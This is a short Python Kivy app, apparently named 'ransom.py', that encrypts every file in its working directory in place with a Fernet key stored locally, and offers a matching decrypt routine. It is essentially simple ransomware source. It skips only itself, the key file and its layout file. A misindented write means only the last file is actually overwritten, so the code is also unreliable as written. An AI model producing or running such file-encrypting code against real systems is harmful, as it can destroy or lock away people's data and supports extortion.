import os
from kivy.app import App
from cryptography.fernet import Fernet
from kivy.lang.builder import Builder
from kivy.uix.boxlayout import BoxLayout

files=[]
class KVBL(BoxLayout):
    

    
    def makelist():
       
        for file in os.listdir():
            if file=="ransom.py" or file=="mykey.key" or file=="Encryption.kv":  
                continue                  #do not encrypt the script and the key      
            if os.path.isfile(file):   #ignore folders
                files.append(file)

    
    
    def encrypt(self):
          
            KVBL.makelist()


            key = Fernet.generate_key()  # generate a key to encrypt/decrypt the files
            with open("mykey.key","wb") as keyfile: # write the key in a file 
                keyfile.write(key)




            for file in files:
                with open(file,"rb") as thefile:
                    contents = thefile.read()    #read the content of the files and store it in a variable
                    encrypted= Fernet(key).encrypt(contents)   #encrypt using the key 
            with open(file,"wb") as thefile:
                    thefile.write(encrypted)     #write the encrypted contents back to the file 



    def decrypt(self):

            KVBL.makelist()

            with open("mykey.key","rb") as mykey:
                key=mykey.read()

            for file in files:
                with open(file,"rb") as thefile:
                    contents = thefile.read()  
                    decrypted= Fernet(key).decrypt(contents)  
                with open(file,"wb") as thefile:
                    thefile.write(decrypted)  



class Encryption(App):
    def build(self):
        Builder.load_file("Encryption.kv")
        return KVBL()
    
      
Encryption().run()

    

 


